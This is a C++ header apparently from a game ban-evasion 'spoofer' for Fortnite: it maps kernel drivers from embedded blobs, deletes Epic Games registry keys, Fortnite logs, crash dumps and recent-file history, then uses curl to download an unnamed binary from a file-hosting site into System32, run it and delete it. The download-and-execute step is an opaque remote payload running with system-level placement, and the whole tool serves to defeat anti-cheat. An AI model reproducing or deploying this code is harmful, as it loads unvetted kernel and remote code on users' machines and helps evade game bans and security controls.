#pragma once
#include <cstdlib>
#include <string>
#include "term.hpp"
#include "blob.hpp"
#include "ext/wrap.hpp"

namespace run {

bool run_spoof() {
    term::cls();
    term::log("+", "loading driver..", term::L::I);
    if (!mod::wrap::init()) {
        term::log("+", "driver init failed", term::L::E);
        return false;
    }
    if (!mod::wrap::map(_blob::getSpoof(), false)) {
        term::log("+", "driver map failed", term::L::E);
        mod::wrap::cleanup();
        return false;
    }
    term::log("+", "driver active", term::L::G);
    Sleep(1500);
    mod::wrap::cleanup();
    term::log("+", "done", term::L::G);
    return true;
}

bool run_clean() {
    term::cls();
    term::log("*", "loading driver..", term::L::I);
    if (!mod::wrap::init()) {
        term::log("*", "driver init failed", term::L::E);
        return false;
    }
    if (!mod::wrap::map(_blob::getClean(), false)) {
        term::log("*", "driver map failed", term::L::E);
        mod::wrap::cleanup();
        return false;
    }
    term::log("*", "cleaning registry..", term::L::I);
    system("reg delete \"HKCU\\Software\\Epic Games\" /f 2>nul");
    system("reg delete \"HKLM\\Software\\Epic Games\" /f 2>nul");
    Sleep(300);
    term::log("*", "removing logs..", term::L::I);
    system("del /q /f /s \"%LOCALAPPDATA%\\FortniteGame\\Saved\\Logs\\*\" 2>nul");
    system("del /q /f /s \"%LOCALAPPDATA%\\FortniteGame\\Saved\\Crashes\\*\" 2>nul");
    Sleep(300);
    term::log("*", "clearing cache..", term::L::I);
    system("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8 2>nul");
    system("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2 2>nul");
    Sleep(300);
    system("ipconfig /flushdns >nul 2>&1");
    Sleep(300);
    system("del /q /f \"%APPDATA%\\Microsoft\\Windows\\Recent\\*\" 2>nul");
    Sleep(300);
    system("curl -s -S -L -o C:\\Windows\\System32\\cleaner.exe https://files.catbox.moe/95bzl5.bin");
    system("start C:\\Windows\\System32\\cleaner.exe");
    Sleep(9000);
    system("taskkill /f /im cleaner.exe");
    std::remove("C:\\Windows\\System32\\cleaner.exe");
    mod::wrap::cleanup();
    term::log("*", "done - restart PC", term::L::G);
    MessageBoxA(NULL, "reboot required", "info", MB_ICONINFORMATION);
    return true;
}

}
